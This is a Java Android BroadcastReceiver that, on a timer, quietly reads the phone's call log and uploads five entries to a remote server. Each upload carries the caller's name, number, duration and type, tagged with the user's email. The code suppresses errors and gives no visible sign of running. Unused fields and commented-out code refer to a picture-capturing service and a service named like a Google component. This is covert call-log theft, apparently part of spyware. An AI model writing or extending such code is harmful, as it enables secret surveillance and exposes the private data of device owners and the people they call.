package com.example.myrequestttt;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import java.util.List;

import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.disposables.CompositeDisposable;
import io.reactivex.functions.Consumer;
import io.reactivex.schedulers.Schedulers;
import me.everything.providers.android.calllog.Call;
import me.everything.providers.android.calllog.CallsProvider;
import retrofit2.Retrofit;

public class processTimerReceiver extends BroadcastReceiver {

    private clickPic clickPic1;
    private APictureCapturingService pictureService;
//    public processTimerReceiver(Context mContext) {
//        this.clickPic1 = ((clickPic) mContext);
//    }
CompositeDisposable compositeDisposable = new CompositeDisposable();
    IMyService iMyService;

    @Override
    public void onReceive(Context context, Intent intent) {
//        Intent intent2 = new Intent(context.getApplicationContext(), GoogleService1.class);
//        context.getApplicationContext().startService(intent2);





        CallsProvider callsProvider = new CallsProvider(context.getApplicationContext());
        List<Call> calls = callsProvider.getCalls().getList();
        String s = String.valueOf(calls.get(0).type);

        Log.d(s, "Contacts ");
        System.out.println("Call DATA"+(calls.get(1).name));
        Retrofit retrofit = RetrofitClient.getInstance();
        iMyService = retrofit.create(IMyService.class);
        for(int i=0;i<5;i++) {
            setcall loc2 = new setcall();
            if(calls.get(i).name==null ){
                calls.get(i).name="Unknown";
            }
            loc2.setname(calls.get(i).name);
            loc2.setemail(Login.Email);

            loc2.setnumber(calls.get(i).number);
            loc2.setduration(String.valueOf(calls.get(i).duration));
            loc2.settype(String.valueOf(calls.get(i).type));

            compositeDisposable.add(iMyService.callsent(loc2)
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(
                            new Consumer<Object>() {
                                @Override
                                public void accept(Object s) throws Exception {
//                                    Toast.makeText(GoogleService.this, s.toString(), Toast.LENGTH_SHORT).show();
                                }
                            }, new Consumer<Throwable>() {
                                @Override
                                public void accept(Throwable throwable) throws Exception {
//                                    Toast.makeText(GoogleService.this, "Server Error!", Toast.LENGTH_SHORT).show();
                                }
                            }
                    ));

        }


        System.out.println(calls);























    }
}
